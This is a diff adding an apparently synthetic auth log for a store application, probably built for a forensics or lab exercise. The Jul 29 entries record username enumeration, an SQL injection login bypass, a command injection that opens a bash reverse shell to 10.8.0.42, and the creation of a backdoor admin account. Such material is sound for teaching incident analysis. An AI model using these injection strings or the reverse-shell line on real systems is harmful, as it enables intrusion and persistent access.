@@ -1,0 +1,50 @@
+Jul 26 07:02:41 majalstore majal-app[1]: AUTH SUCCESS user='m.alfaisal' src=192.168.8.130 session=3bd4cf uid=12
+Jul 26 07:48:47 majalstore majal-app[1]: AUTH SUCCESS user='m.alfaisal' src=192.168.8.97 session=903b9f uid=2
+Jul 26 16:36:20 majalstore majal-app[1]: AUTH SUCCESS user='student11' src=192.168.8.75 session=3ff4b0 uid=19
+Jul 26 19:52:15 majalstore majal-app[1]: AUTH SUCCESS user='student23' src=192.168.8.108 session=8b54f9 uid=38
+Jul 26 20:59:17 majalstore majal-app[1]: AUTH SUCCESS user='student04' src=192.168.8.86 session=0a77a6 uid=30
+Jul 26 21:54:32 majalstore majal-app[1]: AUTH SUCCESS user='student11' src=192.168.8.64 session=f9969f uid=32
+Jul 26 22:30:19 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.130 session=4d8bce uid=25
+Jul 27 07:44:11 majalstore majal-app[1]: AUTH SUCCESS user='m.alfaisal' src=192.168.8.108 session=633dd9 uid=32
+Jul 27 11:31:37 majalstore majal-app[1]: AUTH SUCCESS user='m.alfaisal' src=192.168.8.108 session=fee173 uid=7
+Jul 27 14:10:54 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.86 session=521bb1 uid=28
+Jul 27 14:31:19 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.86 session=48f03f uid=24
+Jul 27 14:37:20 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.64 session=12d28c uid=25
+Jul 27 15:04:26 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.119 session=7cac29 uid=3
+Jul 27 17:00:51 majalstore majal-app[1]: AUTH SUCCESS user='student23' src=192.168.8.86 session=d6c39a uid=26
+Jul 27 22:35:15 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.108 session=9f587a uid=41
+Jul 28 09:03:55 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.75 session=99dc5c uid=15
+Jul 28 10:20:07 majalstore majal-app[1]: AUTH SUCCESS user='student04' src=192.168.8.75 session=a42b23 uid=42
+Jul 28 13:27:27 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.108 session=15a33e uid=28
+Jul 28 16:12:48 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.86 session=1330ea uid=35
+Jul 28 19:18:02 majalstore majal-app[1]: AUTH SUCCESS user='student11' src=192.168.8.64 session=ce12b4 uid=32
+Jul 28 20:11:11 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.130 session=cbcfe2 uid=20
+Jul 28 21:46:15 majalstore majal-app[1]: AUTH SUCCESS user='student37' src=192.168.8.108 session=f66e3e uid=36
+Jul 29 03:53:12 majalstore majal-app[1]: AUTH FAILURE user='hani' src=192.168.0.157 reason=no_such_user
+Jul 29 03:54:27 majalstore majal-app[1]: AUTH FAILURE user='h.alqasimi' src=192.168.0.157 reason=no_such_user
+Jul 29 03:55:58 majalstore majal-app[1]: AUTH FAILURE user='hani.alqasimi' src=192.168.0.157 reason=no_such_user
+Jul 29 03:57:16 majalstore majal-app[1]: AUTH FAILURE user='halqasimi' src=192.168.0.157 reason=no_such_user
+Jul 29 03:58:28 majalstore majal-app[1]: AUTH FAILURE user='hani_q' src=192.168.0.157 reason=no_such_user
+Jul 29 04:00:00 majalstore majal-app[1]: AUTH FAILURE user='hani.q' src=192.168.0.157 reason=no_such_user
+Jul 29 04:01:00 majalstore majal-app[1]: AUTH FAILURE user='hqasimi' src=192.168.0.157 reason=no_such_user
+Jul 29 04:02:06 majalstore majal-app[1]: AUTH FAILURE user='hani01' src=192.168.0.157 reason=no_such_user
+Jul 29 04:03:09 majalstore majal-app[1]: AUTH FAILURE user='h.qasimi' src=192.168.0.157 reason=no_such_user
+Jul 29 04:04:08 majalstore majal-app[1]: AUTH FAILURE user='hani.alq' src=192.168.0.157 reason=no_such_user
+Jul 29 04:05:07 majalstore majal-app[1]: AUTH FAILURE user='alqasimi' src=192.168.0.157 reason=no_such_user
+Jul 29 04:06:09 majalstore majal-app[1]: AUTH FAILURE user='hani-q' src=192.168.0.157 reason=no_such_user
+Jul 29 04:07:14 majalstore majal-app[1]: AUTH FAILURE user='hanialqasimi' src=192.168.0.157 reason=no_such_user
+Jul 29 04:08:35 majalstore majal-app[1]: AUTH FAILURE user='h_alqasimi' src=192.168.0.157 reason=no_such_user
+Jul 29 04:09:31 majalstore majal-app[1]: AUTH SUCCESS user='student01' src=192.168.0.157 session=8f2a1c uid=3
+Jul 29 04:09:40 majalstore majal-app[1]: OBJECT ACCESS user='student01' src=192.168.0.157 object=order/6 owner_uid=3
+Jul 29 04:09:58 majalstore majal-app[1]: SESSION END user='student01' src=192.168.0.157 reason=logout
+Jul 29 10:05:28 majalstore majal-app[1]: AUTH FAILURE user='admin' src=192.168.8.33 reason=bad_password
+Jul 29 10:06:02 majalstore majal-app[1]: AUTH FAILURE user="admin'--" src=192.168.8.33 reason=bad_password
+Jul 29 10:06:35 majalstore majal-app[1]: AUTH SUCCESS user="admin' OR '1'='1'--" src=192.168.8.33 session=c41d99 uid=1 note=query_returned_multiple_rows
+Jul 29 10:07:02 majalstore majal-app[1]: PRIV ESCALATION user='admin' src=192.168.8.33 role=administrator
+Jul 29 10:10:43 majalstore majal-app[1]: ADMIN ACTION user='admin' src=192.168.8.33 action=network_tools host='8.8.8.8; bash -i >& /dev/tcp/10.8.0.42/443 0>&1'
+Jul 29 10:12:32 majalstore majal-app[1]: AUTH SUCCESS user='admin' src=192.168.8.5 session=7b3e02 uid=1
+Jul 29 10:13:43 majalstore majal-app[1]: ADMIN ACTION user='admin' src=192.168.8.5 action=network_tools host='10.0.0.1'
+Jul 29 10:14:08 majalstore majal-app[1]: USER CREATED user='svc_backup' by='admin' src=192.168.8.33 is_admin=1
+Jul 29 10:16:48 majalstore majal-app[1]: ADMIN ACTION user='admin' src=192.168.8.5 action=network_tools host='8.8.8.8'
+Jul 29 10:19:54 majalstore majal-app[1]: SESSION END user='admin' src=192.168.8.33 session=c41d99 reason=logout
+Jul 29 10:22:19 majalstore majal-app[1]: SESSION END user='admin' src=192.168.8.5 session=7b3e02 reason=logout
